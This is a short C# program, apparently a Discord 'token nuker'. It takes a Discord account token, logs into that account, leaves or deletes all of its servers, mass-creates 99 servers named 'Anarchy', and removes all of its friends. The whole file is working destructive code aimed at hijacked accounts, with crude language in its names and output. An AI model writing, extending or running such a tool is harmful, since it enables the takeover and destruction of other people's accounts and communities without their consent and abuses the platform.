using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Gateway;

namespace Token_Fucker
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Enter a token to be fucked.");
            string token = Console.ReadLine();
            DiscordSocketClient client = new DiscordSocketClient(new DiscordSocketConfig() { ApiVersion = 7 });
            client.OnLoggedIn += Client_OnLoggedIn;
            #region Token
            try
            {
                client.Login(token);
            } catch (Discord.InvalidTokenException)
            {
                Console.WriteLine("Invalid token passed.");
            }
            #endregion
            Thread.Sleep(-1);
        }
        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Console.WriteLine("Started client, nuking.");

            // Leave/delete every guild.
            var guilds = client.GetGuilds();
            foreach (var guildids in guilds)
            {
                try
                {
                    client.LeaveGuild(guildids.Id);
                    Console.WriteLine("Left Guild " + guildids.Id);
                }
                catch
                {
                    client.DeleteGuild(guildids.Id);
                    Console.WriteLine("Deleted Guild " + guildids.Id);
                }
            }

            // Mass Create Guilds
            for (int amount = 1; amount < 100; amount++)
            {
                client.CreateGuild("Anarchy", null, "europe");
                Console.WriteLine("Created a guild.");
            }

            // Remove all friends.
            var friends = client.GetRelationships();
            foreach (var friendids in friends)
            {
                client.RemoveRelationship(friendids.User.Id);
                Console.WriteLine("Removed relationship with ID " + friendids.User.Id);
            }

            Console.WriteLine("\n\nFinished fucking the account.");
        }
    }
}
